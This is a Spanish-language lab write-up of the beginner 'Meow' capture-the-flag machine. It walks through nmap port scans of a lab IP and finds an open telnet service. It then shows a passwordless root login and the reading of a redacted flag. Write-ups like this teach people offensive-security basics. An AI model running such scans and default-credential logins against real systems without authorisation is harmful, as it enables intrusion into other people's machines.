# Máquina Meow 

#### Tier: Starting Point
#### Released on: 30/09/2021
#### IP de ejemplo: 10.129.108.168

## Reconocimiento
comenzamos realizando un escaneo de puertos por tcp con la herramienta `nmap`:
```
sudo nmap -sS -p- --open --min-rate 5000 -vvv -Pn -n 10.129.108.168
```
```
Not shown: 65405 closed tcp ports (reset), 129 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
23/tcp open  telnet  syn-ack ttl 63
```
vemos un único puerto abierto. Tratemos de obtener más información del mismo, usando los scripts predeterminados de nmap (-sC) y enumerando la versión del servicio (-sV)
```
nmap -sCV -p23 -T4 10.129.108.168
```
```
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
```
no vemos nada nuevo, vamos a conectarnos al servicio Telnet, para ello vamos a ver los argumentos que se necesitan con el comando `telnet --usage`

```
Usage: telnet [-468acdEKLrx?V] [-b ADDRESS] [-e CHAR] [-l USER] [-n FILE]
            [-k REALM] [-X ATYPE] [--ipv4] [--ipv6] [--binary] [--login]
            [--bind=ADDRESS] [--no-rc] [--debug] [--escape=CHAR] [--no-escape]
            [--no-login] [--user=USER] [--binary-output] [--trace=FILE]
            [--rlogin] [--encrypt] [--realm=REALM] [--disable-auth=ATYPE]
            [--help] [--usage] [--version] [HOST [PORT]]
```


Probemos a entrar con el usuario root, sin proporcionar contraseña: `telnet --user=root 10.129.108.168`
```
Trying 10.129.108.168...
Connected to 10.129.108.168.
Escape character is '^]'.
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
<---SNIP--->
root@Meow:~# 
```
verificamos la intrusión con comandos básicos 
```
root@Meow:~# whoami;hostname -I
root
10.129.108.168 dead:beef::a0de:adff:fed5:dd76 
```
estamos en la máquina víctima, podemos leer la única flag de esta máquina
```
root@Meow:~# cat flag.txt
<REDACTED>
```
